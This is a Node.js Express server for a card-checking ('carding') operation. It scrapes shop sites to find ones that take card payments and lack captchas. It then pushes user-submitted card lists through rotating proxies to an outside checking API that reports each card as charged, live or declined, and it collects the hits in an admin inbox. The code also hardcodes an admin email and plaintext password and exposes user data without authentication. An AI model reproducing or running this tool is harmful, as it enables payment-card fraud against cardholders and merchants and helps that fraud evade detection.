const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// ─── GLOBAL MEMORY DATABASE ───
const db = {
  apiKey: '', 
  users: [
    { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active' }
  ],
  sites: [],
  proxies: [],
  inbox: [],
  activity: [],
  tasks: {},
  proxyIndex: 0
};

app.get('/api/health', (req, res) => res.send('OK'));

function formatProxy(proxyStr) {
  if (!proxyStr) return null;
  let p = proxyStr.trim();
  p = p.replace(/^(socks5|socks4|http|https):\/\//i, '');
  if (p.includes('@')) return `http://${p}`;
  const parts = p.split(':');
  if (parts.length === 4) return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
  if (parts.length === 2) return `http://${parts[0]}:${parts[1]}`;
  return `http://${p}`;
}

// ─── AUTH & USERS ───
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.users.find(u => u.email === email && u.pass === password && u.status === 'active');
  if (user) res.json({ user: { email: user.email, name: user.name, role: user.role } });
  else res.status(401).json({ error: 'Invalid credentials' });
});
app.get('/api/users', (req, res) => res.json(db.users));
app.post('/api/register', (req, res) => {
  const { email, password, name, role } = req.body;
  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'Email exists' });
  db.users.push({ email, pass: password, name, role, status: 'active', checked: 0 });
  res.json({ success: true });
});
app.post('/api/user/status', (req, res) => {
  const user = db.users.find(u => u.email === req.body.email);
  if (user) { user.status = req.body.status; res.json({ success: true }); }
  else res.status(404).json({ error: 'Not found' });
});
app.post('/api/user/delete', (req, res) => {
  db.users = db.users.filter(u => u.email !== req.body.email);
  res.json({ success: true });
});

// ─── SETTINGS ───
app.get('/api/settings', (req, res) => res.json({ apiKey: db.apiKey }));
app.post('/api/settings', (req, res) => {
  db.apiKey = req.body.apiKey || '';
  res.json({ success: true });
});

// ─── PROXY CHECKER (Auto-saves live proxies) ───
app.post('/api/check-proxies', async (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !proxies.length) return res.json({ success: true, live: [] });

  const liveProxies = [];
  const batchSize = 50; 
  
  for (let i = 0; i < proxies.length; i += batchSize) {
    const batch = proxies.slice(i, i + batchSize);
    const results = await Promise.all(batch.map(async (p) => {
      const formatted = formatProxy(p);
      const start = Date.now();
      try {
        const agent = new HttpsProxyAgent(formatted);
        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 5000 });
        return { proxy: p, ms: Date.now() - start };
      } catch (err) { return null; }
    }));
    results.forEach(r => { if (r) liveProxies.push(r); });
  }

  liveProxies.sort((a, b) => a.ms - b.ms);
  
  const newProxies = liveProxies.map(p => p.proxy);
  db.proxies = [...new Set([...db.proxies, ...newProxies])];
  
  res.json({ success: true, live: liveProxies });
});

app.get('/api/proxies', (req, res) => res.json(db.proxies));
app.delete('/api/proxies', (req, res) => {
  const { proxy } = req.body;
  if (!proxy) return res.status(400).json({ error: 'Proxy required' });
  db.proxies = db.proxies.filter(p => p !== proxy);
  res.json({ success: true, total: db.proxies.length });
});

// ─── SITE CHECKER (BOTH SCRAPE & API) ───

// 1. The standard Scrape Checker (Products.json)
app.post('/api/check-sites-advanced', async (req, res) => {
  const { sites, minPrice, maxPrice } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });

  const cleanSites = [];
  
  for (let i = 0; i < sites.length; i += 3) { 
    const batch = sites.slice(i, i + 3);
    await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return;
      
      let proxyStr = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : null;
      let isLive = false, minSitePrice = Infinity, maxSitePrice = 0, graphql = false, checkout = false, captcha = false, stock = false, cardPayment = false;

      const options = { timeout: 10000, validateStatus: () => true };
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
      }

      try {
        const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
          let availableVariants = [];
          
          prodRes.data.products.forEach(prod => {
            if (prod.variants) {
              prod.variants.forEach(v => {
                const price = parseFloat(v.price);
                const isAvailable = v.available === true || v.inventory_quantity > 0 || v.inventory_quantity === undefined || v.inventory_quantity === null;
                if (isAvailable) availableVariants.push({ price, id: v.id });
                if (!isNaN(price) && price > 0) {
                  if (price < minSitePrice) minSitePrice = price;
                  if (price > maxSitePrice) maxSitePrice = price;
                }
              });
            }
          });

          if (availableVariants.length === 0) return; 
          stock = true;
          availableVariants.sort((a, b) => a.price - b.price);

          try {
            const homeRes = await axios.get(`https://${domain}`, options);
            const homeHtml = String(homeRes.data).toLowerCase();
            if (homeHtml.includes('visa') || homeHtml.includes('mastercard') || homeHtml.includes('amex') || homeHtml.includes('stripe') || homeHtml.includes('shopify_payments') || homeHtml.includes('credit_card') || homeHtml.includes('"card"')) {
              cardPayment = true; checkout = true;
            }
            if (homeHtml.includes('hcaptcha') || homeHtml.includes('recaptcha') || homeHtml.includes('captcha')) captcha = true;
          } catch(e) {}

          if (!checkout || !cardPayment) return; 
          try { const gql = await axios.post(`https://${domain}/api/graphql`, { query: '{ shop { name } }' }, options); if (gql.status === 200 && gql.data) graphql = true; } catch(e) {}

          isLive = true;
        }
      } catch (err) {}

      if (isLive && minSitePrice >= minPrice && minSitePrice <= maxPrice) {
        cleanSites.push({ domain, price: minSitePrice.toFixed(2), method: 'Scrape', graphql, checkout, captcha });
      }
    }));
  }
  res.json({ success: true, cleanSites });
});

// 2. The new API Checker (Uses yzio.app API with generated test card)
app.post('/api/check-sites-api', async (req, res) => {
  const { sites, minPrice, maxPrice } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });

  const cleanSites = [];
  const testCard = '4111111111111111|12|2030|123'; // Standard test card
  
  for (let i = 0; i < sites.length; i += 5) { // API handles slightly faster
    const batch = sites.slice(i, i + 5);
    await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return;

      let proxyStr = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : null;
      let options = { timeout: 15000 };
      
      const targetUrl = new URL('https://check.yzio.app/shopify');
      targetUrl.searchParams.append('site', domain);
      targetUrl.searchParams.append('cc', testCard);
      if (db.apiKey) targetUrl.searchParams.append('key', db.apiKey.trim());
      
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
        targetUrl.searchParams.append('proxy', proxyStr);
      }

      try {
        const response = await axios.get(targetUrl.toString(), options);
        const data = response.data;
        
        // The API returns a Price field for the site
        const sitePrice = parseFloat(data.Price);
        if (!isNaN(sitePrice) && sitePrice > 0) {
          if (sitePrice >= minPrice && sitePrice <= maxPrice) {
            cleanSites.push({ domain, price: sitePrice.toFixed(2), method: 'API' });
          }
        }
      } catch (err) {}
    }));
  }
  res.json({ success: true, cleanSites });
});

// Save Sites (Import to Config)
app.post('/api/save-sites', (req, res) => {
  const { sites } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, total: db.sites.length });
  
  sites.forEach(newSite => {
    const domain = newSite.domain || newSite; // handle string or object
    const price = newSite.price || 'N/A';
    if (!db.sites.find(x => x.domain === domain)) {
      db.sites.push({ domain, price, currency: 'USD' });
    }
  });
  res.json({ success: true, total: db.sites.length });
});

app.get('/api/sites', (req, res) => res.json(db.sites));
app.delete('/api/sites', (req, res) => {
  const { domain } = req.body;
  if (!domain) return res.status(400).json({ error: 'Domain required' });
  db.sites = db.sites.filter(s => s.domain !== domain);
  res.json({ success: true, total: db.sites.length });
});

// ─── BACKGROUND TASK SYSTEM ───
app.post('/api/start-task', (req, res) => {
  const { email, cards } = req.body;
  if (!email || !cards || !cards.length) return res.status(400).json({ error: 'Missing data' });
  if (db.tasks[email] && db.tasks[email].status === 'running') return res.status(400).json({ error: 'Task already running' });

  db.tasks[email] = { status: 'running', queue: [...cards], results: [], total: cards.length, checked: 0 };
  processUserTask(email);
  res.json({ success: true });
});

app.get('/api/task-status', (req, res) => {
  const email = req.query.email;
  const task = db.tasks[email];
  if (!task) return res.json({ active: false });
  res.json({ active: task.status === 'running', task });
});

app.post('/api/stop-task', (req, res) => {
  const { email } = req.body;
  if (db.tasks[email]) db.tasks[email].status = 'stopped';
  res.json({ success: true });
});

function getNextProxy() {
  if (db.proxies.length === 0) return null;
  const proxy = db.proxies[db.proxyIndex % db.proxies.length];
  db.proxyIndex++;
  return proxy;
}

async function checkCardWithRetry(cc) {
  let attempts = 0;
  while (attempts < 3) {
    attempts++;
    let proxyStr = getNextProxy();
    let proxyUrl = proxyStr ? formatProxy(proxyStr) : null;

    const siteObj = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : { domain: 'shopify.com' };
    const targetUrl = new URL('https://check.yzio.app/shopify');
    targetUrl.searchParams.append('site', siteObj.domain);
    targetUrl.searchParams.append('cc', cc);
    if (db.apiKey && db.apiKey.trim() !== '') targetUrl.searchParams.append('key', db.apiKey.trim());
    if (proxyStr) targetUrl.searchParams.append('proxy', proxyStr);

    try {
      const options = { timeout: 20000 };
      if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
      
      const response = await axios.get(targetUrl.toString(), options);
      const data = response.data;
      const apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
      
      if (apiResponse.includes('THROTTLED')) {
        await new Promise(r => setTimeout(r, 2000));
        continue; 
      }
      return { success: true, data };
    } catch (err) {
      if (proxyStr && (err.code === 'ECONNABORTED' || err.message.includes('connect'))) {
        db.proxies = db.proxies.filter(p => p !== proxyStr);
      }
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return { success: false, error: 'Max retries reached' };
}

async function processUserTask(email) {
  const task = db.tasks[email];
  
  while (task.queue.length > 0 && task.status === 'running') {
    const cc = task.queue.shift();
    const result = await checkCardWithRetry(cc);
    
    if (result.success) {
      const data = result.data;
      let apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
      let isSuccess = data.Status === true;
      let gateway = data.Gateway || '';
      let price = data.Price || null;
      
      let displayLabel = 'UNKNOWN';
      let uiStatus = 'unknown';

      if (apiResponse.includes('CHARGED') || apiResponse.includes('SUCCESS')) { displayLabel = 'CHARGED'; uiStatus = 'charged'; }
      else if (apiResponse.includes('LIVE') || apiResponse.includes('APPROVED') || apiResponse.includes('INSUFFICIENT') || (isSuccess && apiResponse !== 'CARD_DECLINED')) { displayLabel = 'LIVE'; uiStatus = 'live'; }
      else if (apiResponse.includes('DECLINED') || apiResponse.includes('DEAD') || isSuccess === false) { displayLabel = 'DECLINED'; uiStatus = 'declined'; }
      else if (apiResponse.includes('3DS') || apiResponse.includes('OTP') || apiResponse.includes('AUTHENTICATION')) { displayLabel = '3D'; uiStatus = 'otp'; }
      else if (apiResponse) { displayLabel = apiResponse.substring(0, 12); }

      let message = apiResponse;
      if (gateway) message = `${gateway} - ${apiResponse}`;
      if (price) message += ` ($${price})`;

      const entry = { id: Date.now() + Math.random(), cc, status: uiStatus, label: displayLabel, message: message || 'No message', rawJSON: data, time: new Date().toISOString() };
      task.results.push(entry);
      
      db.activity.unshift({ user: email, action: 'check', card: cc, result: uiStatus, time: entry.time });
      if (db.activity.length > 500) db.activity.pop();
      
      if (uiStatus === 'charged' || uiStatus === 'live') {
        db.inbox.unshift({ user: email, cc: cc, message: displayLabel, time: entry.time });
        if (db.inbox.length > 500) db.inbox.pop();
      }
    } else {
      task.results.push({ id: Date.now() + Math.random(), cc, status: 'unknown', label: 'ERROR', message: result.error || 'Failed', rawJSON: {}, time: new Date().toISOString() });
    }
    task.checked++;
  }
  task.status = 'done';
}

// ─── REPORTING ───
app.get('/api/admin/data', (req, res) => {
  const email = req.query.email;
  let inbox = db.inbox, activity = db.activity;
  if (email && email !== 'yousafcodes.de@gmail.com') {
    inbox = inbox.filter(i => i.user === email);
    activity = activity.filter(a => a.user === email);
  }
  res.json({ inbox, activity });
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
